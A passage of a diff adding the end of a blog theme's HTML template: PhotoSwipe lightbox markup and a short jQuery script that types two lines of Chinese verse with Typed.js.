+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["也曾鲜衣怒马少年时", "一夜忘尽长安花"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
